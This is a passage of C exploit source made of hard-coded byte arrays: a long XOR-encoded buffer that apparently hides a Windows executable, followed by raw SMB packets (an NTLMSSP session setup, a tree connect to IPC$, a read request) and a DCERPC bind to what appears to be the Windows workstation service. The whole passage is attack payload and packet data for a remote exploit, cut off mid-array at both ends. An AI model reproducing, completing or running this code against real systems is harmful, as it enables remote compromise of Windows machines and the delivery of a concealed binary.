"\x00\x02\x10\x00\x00\x00\x50\x0f\x00\x00\x01\x00\x00\x00\x38\x0f"
"\x00\x00\x00\x00\x1b\x00\xb7\x00\x44\x00\x44\x00\x44\x00\xcd\x00"
"\x42\x00\xbb\x00\x72\x00\x2c\x00\xe1\x00\x53\x00\x44\x00\x38\x00"
"\xac\x00\x49\x00\x45\x00\x44\x00\x44\x00\xcd\x00\x02\x00\x4c\x00"
"\xbb\x00\x72\x00\x2c\x00\x5b\x00\x3d\x00\x4e\x00\xac\x00\xac\x00"
"\x5f\x01\x44\x00\x44\x00\x44\x00\xcd\x00\x02\x00\x48\x00\xbb\x00"
"\x72\x00\x2c\x00\x7c\x01\xd3\x00\x05\x01\x4b\x00\xac\x00\xab\x00"
"\x44\x00\x44\x00\x44\x00\xcd\x00\x02\x00\x40\x00\xbb\x00\x72\x00"
"\x2c\x00\x36\x00\x5f\x01\xf7\x00\x52\x00\xac\x00\xa4\x00\x44\x00"
"\x44\x00\x44\x00\xcd\x00\x02\x00\x54\x00\xbb\x00\x72\x00\x2c\x00"
"\xab\x00\x60\x01\xa4\x00\x24\x00\xac\x00\x22\x20\x44\x00\x44\x00"
"\x44\x00\xcd\x00\x02\x00\x50\x00\xac\x00\x44\x00\x44\x00\x44\x00"
"\x44\x00\x75\x00\x1e\x20\x75\x00\x7a\x01\x75\x00\x64\x01\x75\x00"
"\x13\x20\x75\x00\xbb\x00\x1c\x00\x41\x00\x74\x00\x44\x00\x44\x00"
"\x44\x00\xad\x00\x64\x00\x45\x00\x44\x00\x44\x00\x1c\x00\xfd\x00"
"\x45\x00\x42\x00\x44\x00\x44\x00\x41\x00\x40\x00\x44\x00\x44\x00"
"\x44\x00\xcd\x00\x21\x20\xcd\x00\x0a\x00\x60\x00\x45\x00\x65\x01"
"\xc4\x00\x74\x00\x06\x00\x04\x00\x7d\x00\x5a\x01\x31\x00\x3d\x01"
"\x13\x00\x2c\x00\xc4\x00\x44\x00\x44\x00\x44\x00\x2c\x00\x46\x00"
"\x44\x00\x44\x00\x44\x00\x13\x00\x13\x00\x2c\x00\x44\x00\x44\x00"
"\x44\x00\x04\x00\xad\x00\x7a\x01\x44\x00\x44\x00\x44\x00\x1b\x00"
"\xcd\x00\x3a\x00\x64\x00\x13\x00\xbb\x00\x12\x00\x4c\x00\x75\x00"
"\x13\x20\xcd\x00\x02\x00\x58\x00\x16\x00\xcd\x00\xb4\x00\x41\x00"
"\x74\x00\x44\x00\x44\x00\x44\x00\x14\x00\xbb\x00\x32\x00\x60\x00"
"\x17\x00\xbb\x00\x32\x00\x58\x00\xbb\x00\x12\x00\x48\x00\xbb\x00"
"\x32\x00\x58\x00\xbb\x00\x12\x00\x40\x00\x75\x00\x13\x20\x75\x00"
"\x7a\x01\x75\x00\x64\x01\xcd\x00\xb5\x00\x39\x01\x26\x20\x74\x00"
"\x44\x00\x44\x00\x44\x00\xcd\x00\x79\x01\xc4\x00\x20\x20\x02\x00"
"\x1a\x20\x45\x00\x44\x00\x0e\x00\x05\x00\x39\x01\x3e\x01\x44\x00"
"\x44\x00\x44\x00\x44\x00\x31\x00\xb7\x00\x17\x00\x17\x00\x16\x00"
"\x16\x00\x16\x00\x16\x00\x16\x00\x16\x00\xbb\x00\x32\x00\x64\x00"
"\x16\x00\xbb\x00\x12\x00\x54\x00\x75\x00\x1e\x20\x14\x00\xbb\x00"
"\x12\x00\x50\x00\x11\x00\x12\x00\x20\x00\x3a\x01\x74\x00\x44\x00"
"\x44\x00\x44\x00\xc1\x00\x1e\x20\x3c\x00\x48\x00\x0e\x01\x04\x00"
"\x48\x00\x0e\x01\x34\x00\x58\x00\xe9\x00\x0e\x01\x2c\x00\x4c\x00"
"\x7b\x01\x4d\x00\x0e\x01\x04\x00\x70\x00\x0e\x01\x1b\x01\xfc\x00"
"\x44\x00\x44\x00\x44\x00\xcd\x00\xac\x00\x1a\x00\x19\x00\x20\x20"
"\x40\x00\x44\x00\x17\x00\x11\x00\x12\x00\x13\x00\x0e\x01\x28\x00"
"\x60\x00\x5c\x00\x0e\x01\x01\x00\x78\x00\x0e\x01\x10\x00\x41\x00"
"\x3c\x00\x45\x00\xae\x00\x0e\x01\x0e\x00\x5c\x00\x0e\x01\x1e\x00"
"\x64\x00\x45\x00\x7b\x01\xa7\x00\x76\x00\x0d\x00\x0e\x01\x70\x00"
"\x0e\x01\x45\x00\x5e\x01\x75\x00\xbb\x00\xb8\x00\x75\x00\x1e\x20"
"\x0d\x01\x7c\x00\xa4\x00\x30\x00\x43\x00\x26\x20\x39\x20\x49\x00"
"\x45\x00\x83\x00\x7b\x01\xb6\x00\x7f\x00\x38\x00\x60\x00\x50\x00"
"\x31\x00\x04\x01\x0e\x01\x1e\x00\x60\x00\x45\x00\x7b\x01\x22\x00"
"\x0e\x01\x48\x00\x0f\x00\x0e\x01\x1e\x00\x58\x00\x45\x00\x7b\x01"
"\x0e\x01\x40\x00\x0e\x01\x45\x00\xac\x00\x7b\x01\x46\x00\x75\x00"
"\x1e\x20\xcd\x00\xae\x00\x1b\x00\x1a\x00\x19\x00\x1f\x00\x20\x20"
"\x40\x00\x44\x00\xac\x00\x64\x00\xbb\x00\xbb\x00\xbb\x00\x37\x00"
"\x2c\x00\x37\x00\x36\x00\x32\x00\x6a\x00\x21\x00\x3c\x00\x21\x00"
"\x44\x00\x44\x00\x44\x00\x44\x00\x21\x00\x44\x00\xac\x00\x7a\x01"
"\x5f\x01\xbb\x00\xbb\x00\x67\x00\x45\x00\x23\x00\x71\x00\x0f\x00"
"\x18\x00\x47\x01\x42\x00\x41\x00\x42\x00\x42\x00\x42\x00\x46\x00"
"\x42\x00\x42\x00\x42\x00\xdd\x02\xdd\x02\x42\x00\x42\x00\xfa\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x02\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x19\x01\x42\x00\x42\x00\x42\x00\x4c\x00"
"\x5d\x00\x59\x01\x4c\x00\x42\x00\xf6\x00\x4b\x00\x79\x01\x63\x00"
"\xfa\x00\x43\x00\x0e\x00\x79\x01\x63\x00\x16\x00\x2a\x00\x2b\x00"
"\x31\x00\x62\x00\x32\x00\x30\x00\x2d\x00\x25\x00\x30\x00\x23\x00"
"\x2f\x00\x62\x00\x21\x00\x23\x00\x2c\x00\x2c\x00\x2d\x00\x36\x00"
"\x62\x00\x20\x00\x27\x00\x62\x00\x30\x00\x37\x00\x2c\x00\x62\x00"
"\x2b\x00\x2c\x00\x62\x00\x06\x00\x0d\x00\x11\x00\x62\x00\x2f\x00"
"\x2d\x00\x26\x00\x27\x00\x6c\x00\x4f\x00\x4f\x00\x48\x00\x66\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x1f\x00"
"\x55\x00\x5f\x00\x22\x21\x5b\x00\x34\x00\x31\x00\x18\x01\x5b\x00"
"\x34\x00\x31\x00\x18\x01\x5b\x00\x34\x00\x31\x00\x18\x01\xa7\x00"
"\x14\x00\x23\x00\x18\x01\x5a\x00\x34\x00\x31\x00\x18\x01\x10\x00"
"\x2b\x00\x21\x00\x2a\x00\x5b\x00\x34\x00\x31\x00\x18\x01\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x12\x00"
"\x07\x00\x42\x00\x42\x00\x0e\x00\x43\x00\x43\x00\x42\x00\x25\x00"
"\x18\x00\x70\x00\x02\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\xd8\x02\x42\x00\x4d\x00\x43\x00\x49\x00"
"\x43\x00\x47\x00\x4e\x00\x42\x00\x46\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x52\x00\x42\x00\x42\x00\x42\x00\x52\x00\x42\x00\x42\x00\x42\x00"
"\x62\x00\x42\x00\x42\x00\x42\x00\x42\x00\x02\x00\x42\x00\x42\x00"
"\x52\x00\x42\x00\x42\x00\x42\x00\x40\x00\x42\x00\x42\x00\x46\x00"
"\x42\x00\x42\x00\x42\x00\x46\x00\x42\x00\x42\x00\x42\x00\x46\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x62\x00\x42\x00\x42\x00\x42\x00\x40\x00\x42\x00\x42\x00\x21\x00"
"\x5f\x01\x42\x00\x42\x00\x41\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x52\x00\x42\x00\x42\x00\x52\x00"
//------------------------------------------------------------------------------------
"\x42\x00\x42\x00\x42\x00\x42\x00\x52\x00"
"\x42\x00\x42\x00\x52\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x52\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x6c\x00\x36\x00\x27\x00"
"\x3a\x00\x36\x00\x42\x00\x42\x00\x42\x00\x63\x01\x41\x00\x42\x00"
"\x42\x00\x42\x00\x52\x00\x42\x00\x42\x00\x42\x00\x46\x00\x42\x00"
"\x42\x00\x42\x00\x40\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x62\x00\x42\x00\x42\x00\x22\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x02\x01\xae\x00\x6a\x00"
"\x43\x00\x42\x00\x42\x00\xc9\x00\xb6\x00\x5e\x01\x6d\x00\x41\x00"
"\x42\x00\x42\x00\xcb\x00\x44\x00\xdd\x02\x74\x00\x2a\x00\x1a\x01"
"\x0c\x00\x4c\x00\xae\x00\x5e\x01\x0b\x00\x41\x00\x42\x00\x42\x00"
"\xcb\x00\x04\x00\x4a\x00\x5e\x01\x4f\x00\x42\x00\x42\x00\x42\x00"
"\x23\x00\x26\x00\x34\x00\x23\x00\x32\x00\x2b\x00\x71\x00\x70\x00"
"\x6c\x00\x26\x00\x2e\x00\x2e\x00\x42\x00\xdd\x02\x14\x00\x4a\x00"
"\xcb\x00\x04\x00\x4a\x00\xdd\x02\x34\x00\x4a\x00\x2a\x00\xd7\x00"
"\x43\x01\x5c\x00\x5a\x01\x5e\x01\x63\x00\x41\x00\x42\x00\x42\x00"
"\xcb\x00\x04\x00\x52\x00\x0e\x01\x04\x00\x46\x00\x12\x00\x5e\x01"
"\x74\x00\x42\x00\x42\x00\x42\x00\x11\x00\x0d\x00\x04\x00\x16\x00"
"\x15\x00\x03\x00\x10\x00\x07\x00\x1e\x00\x0f\x00\x2b\x00\x21\x00"
"\x30\x00\x2d\x00\x31\x00\x2d\x00\x24\x00\x36\x00\x1e\x00\x15\x00"
"\x2b\x00\x2c\x00\x26\x00\x2d\x00\x35\x00\x31\x00\x62\x00\x0c\x00"
"\x16\x00\x1e\x00\x01\x00\x37\x00\x30\x00\x30\x00\x27\x00\x2c\x00"
"\x36\x00\x14\x00\x27\x00\x30\x00\x31\x00\x2b\x00\x2d\x00\x2c\x00"
"\x1e\x00\x15\x00\x2b\x00\x2c\x00\x2e\x00\x2d\x00\x25\x00\x2d\x00"
"\x2c\x00\x42\x00\x2a\x00\x40\x00\x42\x00\x42\x00\xc2\x00\xdd\x02"
"\x14\x00\x52\x00\xdd\x02\x34\x00\x4a\x00\x2a\x00\x7a\x01\x58\x01"
"\x5e\x00\x6f\x00\x5e\x01\x88\x00\x40\x00\x42\x00\x42\x00\xcb\x00"
"\x04\x00\x52\x00\xdd\x02\x74\x00\x2a\x00\x32\x00\x31\x00\xad\x00"
"\x74\x00\x5e\x01\x6f\x01\x40\x00\x42\x00\x42\x00\xcb\x00\x04\x00"
"\x56\x00\xdd\x02\x74\x00\x2a\x00\x19\x01\x19\x00\x65\x01\x2a\x00"
"\x5e\x01\xee\x00\x40\x00\x42\x00\x42\x00\xcb\x00\x04\x00\x5e\x00"
"\xdd\x02\x34\x00\x4a\x00\x2a\x00\xa4\x00\x31\x00\xa0\x00\x77\x00"
"\x5e\x01\x62\x01\x40\x00\x42\x00\x42\x00\xcb\x00\x04\x00\x62\x00"
"\xdd\x02\x14\x00\x56\x00\xcb\x00\x04\x00\x56\x00\x12\x00\xdd\x02"
"\x14\x00\x5e\x00\x12\x00\xdd\x02\x34\x00\x56\x00\x71\x00\x39\x20"
"\x03\x00\x13\x00\x71\x00\x39\x20\x13\x00\x5e\x01\x45\x00\x42\x00"
"\x42\x00\x42\x00\x11\x00\x3b\x00\x31\x00\x36\x00\x27\x00\x2f\x00"
"\x42\x00\x0e\x01\x04\x00\x46\x00\xc9\x00\x42\x00\x12\x00\xdd\x02"
"\x14\x00\x52\x00\x0e\x01\x04\x00\x46\x00\xc9\x00\x42\x00\x12\x00"
"\xdd\x02\x14\x00\x62\x00\xdd\x02\x74\x00\x2a\x00\x1a\x01\x0c\x00"
"\x4c\x00\xae\x00\x5e\x01\x18\x00\x40\x00\x42\x00\x42\x00\xcb\x00"
"\x04\x00\x4a\x00\xdd\x02\x74\x00\x2a\x00\x0f\x01\x3a\x20\x47\x00"
"\x5a\x01\x5e\x01\x09\x00\x40\x00\x42\x00\x42\x00\xcb\x00\x04\x00"
"\x4e\x00\x2a\x00\x2e\x00\x2e\x00\x42\x00\x42\x00\x2a\x00\x71\x00"
"\x70\x00\x6c\x00\x26\x00\x2a\x00\x35\x00\x31\x00\x70\x00\x1d\x00"
"\x16\x00\xdd\x02\x14\x00\x4a\x00\xcb\x00\x04\x00\x46\x00\xdd\x02"
"\x74\x00\x2a\x00\x30\x00\x3d\x01\x44\x01\x54\x00\x5e\x01\x64\x00"
"\x40\x00\x42\x00\x42\x00\xcb\x00\x04\x00\x52\x00\xdd\x02\x34\x00"
"\x46\x00\x2a\x00\x05\x00\x6e\x00\xd9\x02\x5b\x00\x5e\x01\x54\x00"
"\x40\x00\x42\x00\x42\x00\xcb\x00\x04\x00\x56\x00\xdd\x02\x34\x00"
"\x46\x00\x2a\x00\x30\x20\x7b\x01\x3e\x01\x79\x00\x5e\x01\x44\x00"
"\x40\x00\x42\x00\x42\x00\xcb\x00\x04\x00\x5a\x00\xdd\x02\x34\x00"
"\x46\x00\x2a\x00\x3a\x20\x4b\x00\xb7\x00\x0f\x01\x5e\x01\xb4\x00"
"\x43\x00\x42\x00\x42\x00\xcb\x00\x04\x00\x5e\x00\xdd\x02\x34\x00"
"\x46\x00\x2a\x00\x07\x01\x58\x00\x32\x00\x26\x20\x5e\x01\xa4\x00"
"\x43\x00\x42\x00\x42\x00\xcb\x00\x04\x00\x62\x00\xdd\x02\x34\x00"
"\x46\x00\x2a\x00\x07\x01\x0f\x01\x6c\x00\xab\x00\x5e\x01\x1d\x20"
"\x43\x00\x42\x00\x42\x00\xcb\x00\x04\x00\x66\x00\xdd\x02\x34\x00"
"\x46\x00\x2a\x00\xa7\x00\x0b\x00\xc4\x00\x0b\x00\x5e\x01\x1e\x20"
"\x43\x00\x42\x00\x42\x00\xcb\x00\x04\x00\x6a\x00\xdd\x02\x34\x00"
"\x46\x00\x2a\x00\x04\x01\x3b\x00\x1e\x20\x3b\x00\x5e\x01\xf4\x00"
"\x43\x00\x42\x00\x42\x00\xcb\x00\x04\x00\x6e\x00\xdd\x02\x34\x00"
"\x46\x00\x2a\x00\xf4\x00\x5b\x00\x5a\x00\x04\x01\x5e\x01\xe4\x00"
"\x43\x00\x42\x00\x42\x00\xcb\x00\x04\x00\x02\x00\xdd\x02\x74\x00"
"\x2a\x00\x3c\x00\x61\x01\xa0\x00\x31\x00\x5e\x01\x50\x01\x43\x00"
"\x42\x00\x42\x00\xcb\x00\x04\x00\x06\x00\xdd\x02\x74\x00\x2a\x00"
"\xe7\x00\x55\x00\x42\x00\x3e\x00\x5e\x01\x18\x01\x43\x00\x42\x00"
"\x42\x00\xcb\x00\x04\x00\x0a\x00\xdd\x02\x74\x00\x2a\x00\x5d\x00"
"\x3b\x00\x48\x00\x5e\x01\x5e\x01\x3b\x00"

//------------------------------------------------------------------------------------
"\x43\x00\x42\x00\x42\x00\xcb\x00\x04\x00"
"\x0e\x00\xdd\x02\x74\x00\x2a\x00\x05\x01\x50\x01\x7c\x01\x4d\x00"
"\x5e\x01\x28\x00\x43\x00\x42\x00\x42\x00\xcb\x00\x04\x00\x12\x00"
"\x71\x00\xdd\x02\x02\x01\xae\x00\x47\x01\x43\x00\x42\x00\x42\x00"
"\x16\x00\x2a\x00\x43\x00\x43\x00\x42\x00\x42\x00\xdd\x02\x14\x00"
"\x5a\x00\x12\x00\x12\x00\x12\x00\x12\x00\x02\x00\x12\x00\x02\x00"
"\x12\x00\xdd\x02\x14\x00\x5e\x00\xc9\x00\x61\x01\x15\x00\x15\x00"
"\x2a\x00\x40\x00\x42\x00\x46\x00\x42\x00\xc9\x00\x7d\x01\x28\x00"
"\x54\x00\x13\x00\x11\x00\xdd\x02\x14\x00\x62\x00\x15\x00\x11\x00"
"\xdd\x02\x14\x00\x66\x00\x15\x00\x13\x00\x11\x00\xdd\x02\x14\x00"
"\x6a\x00\xc9\x00\x61\x01\x71\x00\x1a\x20\x12\x00\x46\x00\x56\x00"
"\x12\x00\x46\x00\x12\x00\x41\x00\x1e\x20\x12\x00\x11\x00\xdd\x02"
"\x14\x00\x02\x00\x71\x00\x39\x20\xf3\x00\x41\x00\x14\x00\xc1\x00"
"\x1e\x20\x26\x00\x2a\x00\x21\x00\x2f\x00\x26\x00\x6c\x00\xc9\x00"
"\x3e\x01\xb1\x00\xe4\x00\x1c\x00\x1c\x00\x36\x00\x35\x00\xf3\x00"
"\x41\x00\x14\x00\xc1\x00\x1e\x20\x26\x00\x2a\x00\x24\x00\x36\x00"
"\x32\x00\x6c\x00\xc9\x00\x3e\x01\xb1\x00\xe4\x00\x1c\x00\x1c\x00"
"\x36\x00\x5c\x00\xf3\x00\x41\x00\x14\x00\xc1\x00\x1e\x20\x26\x00"
"\x2a\x00\x27\x00\x3a\x00\x36\x00\x6c\x00\xc9\x00\x3e\x01\xb1\x00"
"\xe4\x00\x1c\x00\x1c\x00\x4d\x00\x06\x01\x0d\x01\x42\x00\x42\x00"
"\x42\x00\xc9\x00\x05\x01\xab\x00\x50\x01\x42\x00\x42\x00\x42\x00"
"\x71\x00\x39\x20\x71\x00\x1a\x20\x12\x00\x12\x00\x46\x00\x40\x00"
"\x12\x00\x13\x00\x13\x00\x2a\x00\x42\x00\x42\x00\x42\x00\x02\x00"
"\xc2\x00\x83\x00\x2a\x00\x41\x00\x5a\x01\x13\x00\xdd\x02\x14\x00"
"\x0a\x00\xc9\x00\x5f\x01\x71\x00\x1a\x20\x12\x00\x02\x00\x12\x00"
"\x46\x00\x21\x00\x41\x00\x1e\x20\x12\x00\x11\x00\xdd\x02\x14\x00"
"\x02\x00\xc7\x00\x1a\x20\x36\x00\x53\x00\x71\x00\x1a\x20\x12\x00"
"\x14\x00\x02\x00\x12\x00\x46\x00\x21\x00\x41\x00\x1e\x20\x12\x00"
"\x15\x00\xdd\x02\x14\x00\x0e\x00\xa9\x00\x7a\x01\x15\x00\xdd\x02"
"\x14\x00\x12\x00\xc9\x00\x05\x01\xa9\x00\x13\x00\xc9\x00\x18\x20"
"\x2a\x00\x27\x00\x3a\x00\x27\x00\x42\x00\x2a\x00\x21\x00\x2f\x00"
"\x26\x00\x6c\x00\xcb\x00\x24\x00\x72\x00\xc1\x00\xae\x00\x16\x00"
"\x0e\x01\x7e\x00\x66\x00\x71\x00\x1a\x20\x71\x00\x39\x20\xc1\x00"
"\x83\x00\x57\x00\xe9\x00\xa0\x00\x7c\x01\x1e\x20\x06\x00\x66\x00"
"\x52\x00\x06\x00\x3d\x01\x06\x00\x66\x00\x7f\x00\xcb\x00\x16\x00"
"\x66\x00\x0a\x00\xcb\x00\x16\x00\x66\x00\x0e\x00\xcb\x00\x16\x00"
"\x66\x00\x12\x00\x0e\x01\x06\x00\x66\x00\x52\x00\x16\x00\x12\x00"
"\x13\x00\x13\x00\x13\x00\x28\x00\x43\x00\x13\x00\x13\x00\xdd\x02"
"\x34\x00\x72\x00\x13\x00\xdd\x02\x14\x00\x52\x00\xc9\x00\x7d\x01"
"\x28\x00\xdd\x02\xdd\x02\x73\x00\xdd\x02\x14\x00\x4e\x00\x15\x00"
"\xdd\x02\x14\x00\x6e\x00\xdd\x02\x14\x00\x56\x00\xab\x00\x79\x01"
"\x3d\x01\xdd\x02\xdd\x02\xc9\x00\x05\x01\x15\x00\xdd\x02\x14\x00"
"\x6e\x00\xdd\x02\x14\x00\x56\x00\xdd\x02\x14\x00\x06\x00\x17\x00"
"\x14\x00\x26\x00\x03\x01\x72\x00\x42\x00\x42\x00\x42\x00\xc7\x00"
"\x1a\x20\x3a\x00\x4e\x00\xc9\x00\x02\x00\x4e\x00\xc9\x00\x32\x00"
"\x5e\x00\x0f\x01\xc9\x00\x2a\x00\x4a\x00\xa9\x00\x4b\x00\xc9\x00"
"\x02\x00\x76\x00\xc9\x00\x19\x01\xfa\x00\x42\x00\x42\x00\x42\x00"
"\xc9\x00\x21\x20\x1c\x00\x1f\x00\xac\x20\x46\x00\x42\x00\x11\x00"
"\x17\x00\x14\x00\x15\x00\xc9\x00\x2e\x00\x66\x00\x5a\x00\xc9\x00"
"\x07\x00\x7e\x00\xc9\x00\x16\x00\x6a\x00\x3a\x00\x41\x00\x14\x20"
"\xc9\x00\x08\x00\x5a\x00\xc9\x00\x18\x00\x62\x00\x41\x00\x7a\x01"
"\xc7\x02\x70\x00\x0b\x00\xc9\x00\x76\x00\xc9\x00\x41\x00\xb7\x00"
"\x71\x00\xdd\x02\x3e\x01\x71\x00\x1a\x20\xee\x00\x7a\x00\xd8\x02"
"\x36\x00\x45\x00\x83\x00\x64\x01\x4f\x00\x41\x00\x5f\x01\xa9\x00"
"\xb0\x00\x79\x00\x3e\x00\x66\x00\x56\x00\x37\x00\x41\x01\xc9\x00"
"\x18\x00\x66\x00\x41\x00\x7a\x01\x24\x00\xc9\x00\x4e\x00\x09\x00"
"\xc9\x00\x18\x00\x5e\x00\x41\x00\x7a\x01\xc9\x00\x46\x00\xc9\x00"
"\x41\x00\x21\x20\xa9\x00\x40\x00\x71\x00\x1a\x20\xc9\x00\x14\x20"
"\x1d\x00\x1c\x00\x1f\x00\x19\x00\xac\x20\x46\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00\x42\x00"
"\x42\x00\x42\x00\x42\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00";
unsigned char DCERPC_Bind_UUID[]=
"\x00\x00\x00\x88\xff\x53\x4d\x42\x2f\x00"
"\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x08\xff\xfe\x00\x08\x50\x00\x0e\xff\x00\xde\xde\x00"
"\x40\x00\x00\x00\x00\xff\xff\xff\xff\x08\x00\x48\x00\x00\x00\x48"
"\x00\x40\x00\x00\x00\x00\x00\x49\x00\xee\x05\x00\x0b\x03\x10\x00"
"\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00\xb8\x10\xb8\x10\x00\x00"
"\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x98\xd0\xff\x6b\x12\xa1"
"\x10\x36\x98\x33\x46\xc3\xf8\x7e\x34\x5a\x01\x00\x00\x00\x04\x5d"
"\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60\x02\x00"
"\x00";
unsigned char Read_AndX_Request[]=
"\x00\x00\x00\x3b\xff\x53\x4d\x42\x2e\x00"
"\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x08\xff\xfe\x00\x08\x61\x00\x0c\xff\x00\xde\xde\x00"
"\x40\x00\x00\x00\x00\x00\x04\x00\x04\xff\xff\xff\xff\x00\x04\x00"
"\x00\x00\x00\x00";
unsigned char Tree_Connect_AndX_Request[]=
"\x00\x00\x00\x60\xff\x53\x4d\x42\x75\x00"
"\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\xff\xfe\x00\x08\x30\x00\x04\xff\x00\x60\x00\x08"
"\x00\x01\x00\x35\x00\x00\x5c\x00\x5c\x00\x31\x00\x32\x00\x37\x00"
"\x2e\x00\x30\x00\x30\x00\x30\x00\x2e\x00\x30\x00\x30\x00\x30\x00"
"\x2e\x00\x30\x00\x30\x00\x31\x00\x5c\x00\x49\x00\x50\x00\x43\x00"
"\x24\x00\x00\x00\x3f\x3f\x3f\x3f\x3f";
unsigned char Session_Setup_AndX_Request1[]=
"\x00\x00\x00\xb6\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x18\x07\xc8\x2a\x44\x8b\xbe\xda\x2a\xaa\xba\x7e\x77"
"\xd3\x92\x00\x00\xff\xfe\x00\x00\x10\x00\x0c\xff\x00\xb6\x00\x04"
"\x11\x0a\x00\x00\x00\x00\x00\x00\x00\x32\x00\x00\x00\x00\x00\xd4"
"\x00\x00\xa0\x7b\x00\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00"
"\x00\x97\xb2\x08\xe0\x0d\x00\x0d\x00\x25\x00\x00\x00\x05\x00\x05"
"\x00\x20\x00\x00\x00\x4e\x49\x47\x48\x54\x47\x52\x55\x50\x41\x5f"
"\x52\x4f\x42\x4f\x43\x5a\x41\x15\x57\x00\x69\x00\x6e\x00\x64\x00"
"\x6f\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x32\x00"
"\x20\x00\x32\x00\x36\x00\x30\x00\x30\x00\x00\x00\x57\x00\x69\x00"
"\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00"
"\x30\x00\x32\x00\x20\x00\x35\x00\x2e\x00\x31\x00\x00\x00\x00";
unsigned char Session_Setup_AndX_Request2[]=
"\x00\x00\x01\x2a\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x18\x07\xc8\x2a\x44\x8b\xbe\xda\x2a\xaa\xba\x7e\x77"
